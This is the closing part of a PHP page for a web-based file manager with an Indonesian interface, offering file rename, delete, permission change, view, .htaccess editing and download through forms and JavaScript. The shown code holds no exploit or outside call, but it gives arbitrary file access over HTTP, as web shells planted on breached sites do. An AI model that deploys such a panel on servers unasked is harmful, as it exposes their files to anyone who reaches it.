                                                    <a href="?d=<?= urlencode($file['path']) ?>"><?= sanitizePath($file['name']) ?></a>
                                                <?php else: ?>
                                                    <span><?= sanitizePath($file['name']) ?></span>
                                                <?php endif; ?>
                                            </div>
                                        </td>
                                        <td>
                                            <span class="permissions" title="<?= $fileManager->getPermissionDescription($file['path']) ?>">
                                                <?= $file['permissions'] ?> (<?= $fileManager->getPermissionNumeric($file['path']) ?>)
                                            </span>
                                        </td>
                                        <td><span class="size"><?= $file['size'] ?></span></td>
                                        <td><span class="modified"><?= $file['modified'] ?></span></td>
                                        <td>
                                            <div class="file-actions">
                                                <form method="POST" style="display: inline;">
                                                    <input type="hidden" name="rename_path" value="<?= sanitizePath($file['path']) ?>">
                                                    <input type="text" name="new_name" placeholder="Nama baru" required>
                                                    <button type="submit" name="rename" class="btn btn-warning">
                                                        <i class="fas fa-edit"></i>
                                                    </button>
                                                </form>
                                                
                                                <form method="POST" style="display: inline;" onsubmit="return confirm('Yakin ingin menghapus <?= sanitizePath($file['name']) ?>?')">
                                                    <input type="hidden" name="delete_path" value="<?= sanitizePath($file['path']) ?>">
                                                    <button type="submit" class="btn btn-danger">
                                                        <i class="fas fa-trash"></i>
                                                    </button>
                                                </form>
                                                
                                                <!-- Permission Control -->
                                                <form method="POST" style="display: inline;">
                                                    <input type="hidden" name="permission_path" value="<?= sanitizePath($file['path']) ?>">
                                                    <input type="text" name="permission_mode" placeholder="755" value="<?= $fileManager->getPermissionNumeric($file['path']) ?>" style="width: 60px;" title="Format: 3 digit (0-7) contoh: 755, 644, 777">
                                                    <button type="submit" name="change_permission" class="btn btn-info" title="Ubah Permission">
                                                        <i class="fas fa-shield-alt"></i>
                                                    </button>
                                                </form>
                                                
                                                <?php if (!$file['isDir']): ?>
                                                    <button type="button" class="btn btn-info" onclick="viewFile('<?= urlencode($file['path']) ?>', '<?= sanitizePath($file['name']) ?>')">
                                                        <i class="fas fa-eye"></i>
                                                    </button>
                                                    <?php 
                                                    $isHtaccess = ($file['name'] === '.htaccess');
                                                    $extension = strtolower(pathinfo($file['path'], PATHINFO_EXTENSION));
                                                    if (($isHtaccess || in_array($extension, $fileManager->getAllowedExtensions())) && is_writable($file['path'])): 
                                                    ?>
                                                        <a href="?edit=<?= urlencode($file['path']) ?>" class="btn btn-warning">
                                                            <i class="fas fa-edit"></i>
                                                        </a>
                                                    <?php endif; ?>
                                                <?php endif; ?>
                                            </div>
                                        </td>
                                    </tr>
                                <?php endforeach; ?>
                            <?php else: ?>
                                <tr>
                                    <td colspan="5" style="text-align: center; padding: 40px; color: #666;">
                                        <i class="fas fa-folder-open"></i> Direktori kosong
                                    </td>
                                </tr>
                            <?php endif; ?>
                        </tbody>
                    </table>
                <?php endif; ?>
            <?php else: ?>
                <div style="text-align: center; padding: 40px; color: #666;">
                    <i class="fas fa-exclamation-triangle"></i> Sistem tidak dapat diakses
                </div>
            <?php endif; ?>
        </div>
    </div>

    <script>
        // Auto-hide alerts after 5 seconds
        setTimeout(function() {
            const alerts = document.querySelectorAll('.alert');
            alerts.forEach(function(alert) {
                alert.style.opacity = '0';
                alert.style.transition = 'opacity 0.5s ease';
                setTimeout(function() {
                    alert.remove();
                }, 500);
            });
        }, 5000);

        // Add smooth scrolling
        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', function (e) {
                e.preventDefault();
                document.querySelector(this.getAttribute('href')).scrollIntoView({
                    behavior: 'smooth'
                });
            });
        });

        // Tree view toggle function
        function toggleTree(element, targetId) {
            const target = document.getElementById(targetId);
            if (target) {
                const isVisible = target.style.display !== 'none';
                target.style.display = isVisible ? 'none' : 'block';
                element.classList.toggle('expanded', !isVisible);
            }
        }

        // Expand all tree items
        function expandAll() {
            document.querySelectorAll('.tree-children').forEach(function(child) {
                child.style.display = 'block';
            });
            document.querySelectorAll('.tree-toggle').forEach(function(toggle) {
                toggle.classList.add('expanded');
            });
        }

        // Collapse all tree items
        function collapseAll() {
            document.querySelectorAll('.tree-children').forEach(function(child) {
                child.style.display = 'none';
            });
            document.querySelectorAll('.tree-toggle').forEach(function(toggle) {
                toggle.classList.remove('expanded');
            });
        }

        // Add tree control buttons if tree view is active
        if (document.getElementById('directory-tree')) {
            const treeControls = document.createElement('div');
            treeControls.style.marginBottom = '15px';
            treeControls.innerHTML = `
                <button onclick="expandAll()" class="btn btn-info" style="margin-right: 10px;">
                    <i class="fas fa-expand"></i> Expand All
                </button>
                <button onclick="collapseAll()" class="btn btn-warning">
                    <i class="fas fa-compress"></i> Collapse All
                </button>
            `;
            document.getElementById('directory-tree').parentNode.insertBefore(treeControls, document.getElementById('directory-tree'));
        }

        // Code editor enhancements
        const codeEditor = document.querySelector('.code-editor');
        if (codeEditor) {
            // Auto-resize textarea
            function autoResize() {
                codeEditor.style.height = 'auto';
                codeEditor.style.height = codeEditor.scrollHeight + 'px';
            }
            
            codeEditor.addEventListener('input', autoResize);
            codeEditor.addEventListener('focus', autoResize);
            
            // Keyboard shortcuts
            codeEditor.addEventListener('keydown', function(e) {
                // Ctrl+S to save
                if (e.ctrlKey && e.key === 's') {
                    e.preventDefault();
                    const saveButton = document.querySelector('button[name="save_edit"], button[name="create_file"]');
                    if (saveButton) {
                        saveButton.click();
                    }
                }
                
                // Tab key support
                if (e.key === 'Tab') {
                    e.preventDefault();
                    const start = this.selectionStart;
                    const end = this.selectionEnd;
                    
                    this.value = this.value.substring(0, start) + '    ' + this.value.substring(end);
                    this.selectionStart = this.selectionEnd = start + 4;
                }
            });
            
            // Initial resize
            autoResize();
        }

        // Form validation for create file
        const createForm = document.querySelector('.create-form');
        if (createForm) {
            const fileNameInput = document.getElementById('file_name');
            const fileContentInput = document.getElementById('file_content');
            
            createForm.addEventListener('submit', function(e) {
                if (!fileNameInput.value.trim()) {
                    e.preventDefault();
                    alert('Nama file tidak boleh kosong!');
                    fileNameInput.focus();
                    return false;
                }
                
                // Check for invalid characters
                const invalidChars = /[<>:"\/\\|?*]/;
                if (invalidChars.test(fileNameInput.value)) {
                    e.preventDefault();
                    alert('Nama file tidak boleh mengandung karakter: < > : " / \\ | ? *');
                    fileNameInput.focus();
                    return false;
                }
            });
        }

        // Modal functionality
        let currentFilePath = '';

        function viewFile(filePath, fileName) {
            currentFilePath = filePath;
            
            // Show loading
            document.getElementById('modalFileName').textContent = fileName;
            document.getElementById('modalFilePath').innerHTML = '<span class="loading-spinner"></span><span class="loading-text">Loading...</span>';
            document.getElementById('modalFileSize').innerHTML = '<span class="loading-spinner"></span><span class="loading-text">Loading...</span>';
            document.getElementById('modalFileModified').innerHTML = '<span class="loading-spinner"></span><span class="loading-text">Loading...</span>';
            document.getElementById('modalFilePermissions').innerHTML = '<span class="loading-spinner"></span><span class="loading-text">Loading...</span>';
            document.getElementById('modalFileExtension').innerHTML = '<span class="loading-spinner"></span><span class="loading-text">Loading...</span>';
            document.getElementById('modalFileLines').innerHTML = '<span class="loading-spinner"></span><span class="loading-text">Loading...</span>';
            document.getElementById('modalFileChars').innerHTML = '<span class="loading-spinner"></span><span class="loading-text">Loading...</span>';
            document.getElementById('modalFileContent').value = 'Loading file content...';
            
            // Show loading message in header
            const modalHeader = document.querySelector('.modal-header h3');
            modalHeader.innerHTML = '<i class="fas fa-spinner fa-spin" style="color: #667eea;"></i> ' + fileName + ' <small style="font-size: 0.7em; color: #667eea;">(Loading...)</small>';
            
            // Store original header text for error cases
            window.originalHeaderText = '<i class="fas fa-file-alt"></i> ' + fileName;
            
            // Set timeout to show error if loading takes too long
            window.loadingTimeout = setTimeout(() => {
                modalHeader.innerHTML = '<i class="fas fa-clock" style="color: #ffc107;"></i> ' + fileName + ' <small style="font-size: 0.7em; color: #ffc107;">(Loading timeout)</small>';
                setTimeout(() => {
                    modalHeader.innerHTML = window.originalHeaderText;
                }, 2000);
            }, 10000); // 10 seconds timeout
            
            // Show modal
            document.getElementById('fileModal').style.display = 'block';
            
            // Fetch file content via AJAX
            fetch('?view=' + encodeURIComponent(filePath), {
                headers: {
                    'X-Requested-With': 'XMLHttpRequest'
                }
            })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        document.getElementById('modalFileName').textContent = data.name;
                        document.getElementById('modalFilePath').textContent = data.path;
                        document.getElementById('modalFileSize').textContent = data.size;
                        document.getElementById('modalFileModified').textContent = data.modified;
                        document.getElementById('modalFilePermissions').textContent = data.permissions;
                        document.getElementById('modalFileExtension').textContent = data.extension || 'No extension';
                        document.getElementById('modalFileContent').value = data.content;
                        
                        // Calculate lines and characters
                        const content = data.content;
                        const lines = content.split('\n').length;
                        const chars = content.length;
                        document.getElementById('modalFileLines').textContent = lines;
                        document.getElementById('modalFileChars').textContent = chars;
                        
                        // Clear loading timeout
                        if (window.loadingTimeout) {
                            clearTimeout(window.loadingTimeout);
                        }
                        
                        // Show success message briefly
                        const modalHeader = document.querySelector('.modal-header h3');
                        modalHeader.innerHTML = '<i class="fas fa-check-circle" style="color: #28a745;"></i> ' + data.name + ' <small style="font-size: 0.7em; color: #28a745;">(Loaded successfully)</small>';
                        setTimeout(() => {
                            modalHeader.innerHTML = window.originalHeaderText;
                        }, 2000);
                        
                        // Special handling for .htaccess files
                        if (data.name === '.htaccess') {
                            document.getElementById('htaccessInfo').style.display = 'block';
                            document.getElementById('htaccessDescription').textContent = 'Apache Configuration File - Mengatur pengaturan server web Apache';
                            document.getElementById('htaccessHelpBtn').style.display = 'inline-block';
                            
                            // Add syntax highlighting for .htaccess
                            const textarea = document.getElementById('modalFileContent');
                            textarea.classList.add('htaccess');
                            textarea.style.fontFamily = 'Consolas, Monaco, "Courier New", monospace';
                        } else {
                            document.getElementById('htaccessInfo').style.display = 'none';
                            document.getElementById('htaccessHelpBtn').style.display = 'none';
                            
                            // Remove htaccess styling
                            const textarea = document.getElementById('modalFileContent');
                            textarea.classList.remove('htaccess');
                        }
                    } else {
                        // Clear loading timeout
                        if (window.loadingTimeout) {
                            clearTimeout(window.loadingTimeout);
                        }
                        
                        document.getElementById('modalFileContent').value = 'Error: ' + data.message;
                        document.getElementById('modalFilePath').textContent = 'Error';
                        document.getElementById('modalFileSize').textContent = 'Error';
                        document.getElementById('modalFileModified').textContent = 'Error';
                        document.getElementById('modalFilePermissions').textContent = 'Error';
                        document.getElementById('modalFileExtension').textContent = 'Error';
                        document.getElementById('modalFileLines').textContent = 'Error';
                        document.getElementById('modalFileChars').textContent = 'Error';
                        
                        // Show error message in header
                        const modalHeader = document.querySelector('.modal-header h3');
                        modalHeader.innerHTML = '<i class="fas fa-exclamation-triangle" style="color: #dc3545;"></i> ' + fileName + ' <small style="font-size: 0.7em; color: #dc3545;">(Error loading file)</small>';
                        setTimeout(() => {
                            modalHeader.innerHTML = window.originalHeaderText;
                        }, 3000);
                    }
                })
                .catch(error => {
                    // Clear loading timeout
                    if (window.loadingTimeout) {
                        clearTimeout(window.loadingTimeout);
                    }
                    
                    document.getElementById('modalFileContent').value = 'Error loading file: ' + error.message;
                    document.getElementById('modalFilePath').textContent = 'Network Error';
                    document.getElementById('modalFileSize').textContent = 'Network Error';
                    document.getElementById('modalFileModified').textContent = 'Network Error';
                    document.getElementById('modalFilePermissions').textContent = 'Network Error';
                    document.getElementById('modalFileExtension').textContent = 'Network Error';
                    document.getElementById('modalFileLines').textContent = 'Network Error';
                    document.getElementById('modalFileChars').textContent = 'Network Error';
                    
                    // Show network error message in header
                    const modalHeader = document.querySelector('.modal-header h3');
                    modalHeader.innerHTML = '<i class="fas fa-wifi" style="color: #dc3545;"></i> ' + fileName + ' <small style="font-size: 0.7em; color: #dc3545;">(Network error)</small>';
                    setTimeout(() => {
                        modalHeader.innerHTML = window.originalHeaderText;
                    }, 3000);
                });
        }

        function closeModal() {
            // Clear loading timeout
            if (window.loadingTimeout) {
                clearTimeout(window.loadingTimeout);
            }
            
            document.getElementById('fileModal').style.display = 'none';
            currentFilePath = '';
        }

        function editFileFromModal() {
            if (currentFilePath) {
                window.location.href = '?edit=' + encodeURIComponent(currentFilePath);
            }
        }

        function downloadFile() {
            if (currentFilePath) {
                const link = document.createElement('a');
                link.href = '?view=' + encodeURIComponent(currentFilePath) + '&download=1';
                link.download = document.getElementById('modalFileName').textContent;
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            }
        }

        function showHtaccessHelp() {
            const helpContent = `
.htaccess File Help

Common .htaccess Directives:

1. REWRITE RULES:
   RewriteEngine On
   RewriteRule ^old-page$ /new-page [R=301,L]

2. SECURITY:
   Options -Indexes
   Order Deny,Allow
   Deny from all

3. CACHING:
   ExpiresActive On
   ExpiresByType text/css "access plus 1 month"

4. COMPRESSION:
   <IfModule mod_deflate.c>
       AddOutputFilterByType DEFLATE text/html text/plain text/xml
   </IfModule>

5. ERROR PAGES:
   ErrorDocument 404 /404.html
   ErrorDocument 500 /500.html

6. REDIRECTS:
   Redirect 301 /old-url /new-url
   Redirect 302 /temporary /new-location

7. PASSWORD PROTECTION:
   AuthType Basic
   AuthName "Restricted Area"
   AuthUserFile /path/to/.htpasswd
   Require valid-user

8. CUSTOM HEADERS:
   Header always set X-Frame-Options DENY
   Header always set X-Content-Type-Options nosniff

Tips:
- Test changes on staging first
- Keep backup of original .htaccess
- Check Apache error logs if issues occur
- Some hosts may disable certain directives
            `;
            
            alert(helpContent);
        }

        // Close modal when clicking outside
        window.onclick = function(event) {
            const modal = document.getElementById('fileModal');
            if (event.target === modal) {
                closeModal();
            }
        }

        // Close modal with Escape key
        document.addEventListener('keydown', function(event) {
            if (event.key === 'Escape') {
                closeModal();
            }
        });

        // Auto-resize modal textarea
        const modalTextarea = document.getElementById('modalFileContent');
        if (modalTextarea) {
            function autoResizeModal() {
                modalTextarea.style.height = 'auto';
                modalTextarea.style.height = Math.min(modalTextarea.scrollHeight, 400) + 'px';
            }
            
            modalTextarea.addEventListener('input', autoResizeModal);
            modalTextarea.addEventListener('focus', autoResizeModal);
            
            // Initial resize
            autoResizeModal();
        }

        // Add keyboard shortcuts for modal
        document.addEventListener('keydown', function(event) {
            // Ctrl+O to open file (if modal is open)
            if (event.ctrlKey && event.key === 'o' && document.getElementById('fileModal').style.display === 'block') {
                event.preventDefault();
                editFileFromModal();
            }
            
            // Ctrl+S to save file (if modal is open and in edit mode)
            if (event.ctrlKey && event.key === 's' && document.getElementById('fileModal').style.display === 'block') {
                event.preventDefault();
                editFileFromModal();
            }
        });
    </script>
</body>
</html> 
